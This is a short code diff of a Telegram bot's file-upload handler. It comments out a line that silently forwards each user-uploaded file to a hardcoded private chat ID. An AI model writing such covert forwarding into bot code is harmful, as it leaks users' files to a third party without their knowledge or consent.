@@ -71,7 +71,7 @@ async def upload(bot: Client, m: Message):
     editable = await m.reply_text('𝕤ᴇɴᴅ ᴛxᴛ ғɪʟᴇ ⚡️ **\n\nDeveloper** : 🅑🅞🅣 🅜🅐🅓🅔 🅑🅨  LOVER 💖 BOY  content: @SONICKUWALSSCBOT **')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(-1002461666553, x)
+    #await bot.send_document(-1002461666553, x)
     await input.delete(True)
 
     #path = f"./downloads/{m.chat.id}"
